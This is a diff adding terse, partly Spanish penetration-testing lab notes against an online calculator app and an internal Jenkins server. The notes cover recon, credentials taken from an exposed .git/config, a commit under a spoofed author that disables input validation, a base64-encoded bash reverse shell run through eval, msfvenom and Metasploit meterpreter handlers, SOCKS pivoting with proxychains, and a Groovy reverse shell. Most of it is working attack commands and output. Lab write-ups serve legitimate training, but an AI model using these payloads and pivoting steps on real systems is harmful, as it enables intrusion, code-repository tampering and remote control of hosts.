@@ -1,0 +1,134 @@
+L4B 2
+cat /etc/hosts
+192.224.252.3 online-calc.com
+ 
+[+]NMAP[+]
+8000/tcp open  http    Werkzeug httpd 1.0.1
+192.224.252.3:8000/.git/
+|     Git repository found!
+|     .git/config matched patterns 'passw' 'user'
+
+[+]GOBUSTER[+]
+http://online-calc.com:8000/
+/console              (Status: 200) [Size: 1985]
+/evaluate             (Status: 200) [Size: 31] 
+
+http://online-calc.com:8000/.git/
+/index                (Status: 200) [Size: 209]
+/config               (Status: 200) [Size: 1474]
+/description          (Status: 200) [Size: 73] 
+
+[+]DOWNLOAD[+]
+/config > 
+[remote "origin"]
+        url = http://online-calc.com/projects/online-calc
+        fetch = +refs/heads/*:refs/remotes/origin/*
+
+[user]
+        name = Jeremy McCarthy
+        email = jeremy@dummycorp.com
+        password = diamonds
+        username = jeremy
+
+[+]GITHUB[+]
+git clone http://online-calc.com/projects/online-calc
+git log
+commit 17f5d49be5ae6f0bc41fc90f5aabeccc90f6e2cd
+Author: Jeremy McCarthy <jeremy@dummycorp.com>
+Date:   Wed Oct 21 16:49:37 2020 +0000
+
+    Re-enabled regex route for app resource loading and kept some filters to avoid arbitrary file read!
+
+commit 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd
+Author: Jeremy McCarthy <jeremy@dummycorp.com>
+Date:   Wed Oct 21 16:26:49 2020 +0000
+
+    [Critical] Fixed an issue that leads to RCE! eval is now protected...
+    
+nano APY.py
+#iValid(expr)
+ #return error(invalid expresion)
+ #
+
+git status (comprobar)
+ modified APY.py
+git add . (añadir cambios)
+git commit -m "Bug Fix" --author "Jeremy McCarthy <jeremy@dummycorp.com>" (new commit)
+git push (subirlo)
+git clone http://online-calc.com/projects/online-calc
+comprobamos que isValid esta #comentado para aplicar RCE
+
+def isValid(expr):
+        allowed_chars = "0123456789+-*/%.()"
+
+#if not isValid(expr):
+                        #return error("Invalid expression!")
+
+Dado que la función convertiría los caracteres en la carga útil del usuario , codificaremos en base64 la carga útil
+[+]REVERSHELL[+]
+echo 'bash -c "bash -i >& /dev/tcp/192.109.195.2/4444 0>&1"' | base64
+
+PAYLOAD
+__import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTgzLjE3NC4yLzQ0NDQgMD4mMSIK= | base64 -d | bash")
+
+
+get revershell
+find -name flag
+[+]flag.txt[+]
+
+[+]PIVOTING[+]
+192.219.68.2
+Obtener una sesion con metrpreter;
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.196.85.2 LPORT=5555 -f elf > payload.bin
+python3 -m http.server 80
+wget http://192.192.192/payload.bin
+chmod +x payload.bin
+
+msfconsole -q
+use exploit/multi/handler
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST 192.205.137.3
+set LPORT 5555
+run
+
+./payload.bin
+
+meterpreter > ifconfig
+192.205.137.3
+new ip
+
+[+]PIVOTING[+]
+background
+route add 192.205.137.0/24 1
+
+auxiliary module to convert the meterpreter session to serve as a socks proxy:
+use auxiliary/server/socks_proxy 
+set SRVPORT 9050 (default-proxy-chains)
+set VERSION 4a 
+run -j (be started as a background process )
+
+
+Now anything we sent over port 9050 would be sent over to the network we added to the route
+proxychains nmap -sT -P0 192.108.156.3
+Nmap scan report for 192.205.137.3
+Host is up (0.0010s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+8080/tcp open  http-proxy
+
+configurar proxy navegador :
+manual settings;
+socks host 127.0.0.1
+port 9050
+
+http://192.205.137.3:8080
+[+]Jenkins web[+]
+Groovy reverse and bind shells
+String host="10.10.10.100";
+int port=5555;
+String cmd="/bin/sh";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+proxychains nc -v 192.205.137.3 5555
+whoami 
+jenkins
